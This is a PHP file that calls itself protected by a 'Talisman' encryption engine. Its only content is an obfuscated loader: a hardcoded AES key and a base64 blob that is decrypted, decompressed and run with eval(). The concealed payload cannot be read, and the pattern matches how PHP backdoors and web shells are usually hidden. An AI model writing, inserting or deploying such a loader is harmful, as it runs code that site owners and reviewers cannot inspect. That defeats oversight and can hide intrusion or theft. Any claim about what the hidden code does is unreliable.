<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k0b2d7 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$pb9e85 = base64_decode('H0dpbqFd75NR/8/wjatGizl2SFNoKy9FejN5TldtNHduU1N3U2tkeXNNSWZZTG1RQUdTNFRMVW5OUTM4Z3BXSWJRWEV6R1dmZ2dia0lUZndQS0dhNWlxdW54VXZmYW5IMzlTL2VCeUZ3NlZzcmtOZzF5YzVHaERqSkEvc0s2dzd3NUJTRiszTlRYSEp0UlNaT25BQWJnMlFubjNzRlRkaHRTY2QvMk5mRlB1TzZ2SHV2dytldGZpbVpnS282R2JKcTFic0FOZHJNTkpPMVFDRDU3SU1PV3N6MUV1RGFQakF5cUlvUWNrMlA0d1FBNWpPeitwT21XbmpQMVFYQVViNDRhQ2tGanVFRnFoZ1pLYjRCeEJUc0w1UFhtY2N5LzVOQkRIS3hMV2hkYkJMME9FVGp3cjBRaDVBU3ZDbEE3aGo0cUZnNmNUM2dldGNVeEVR');
$i9e5f7 = openssl_cipher_iv_length('aes-256-cbc');
$vaf3df = substr($pb9e85, 0, $i9e5f7);
$c66e65 = substr($pb9e85, $i9e5f7);
eval('?>'.gzinflate(openssl_decrypt($c66e65, 'aes-256-cbc', $k0b2d7, 0, $vaf3df)));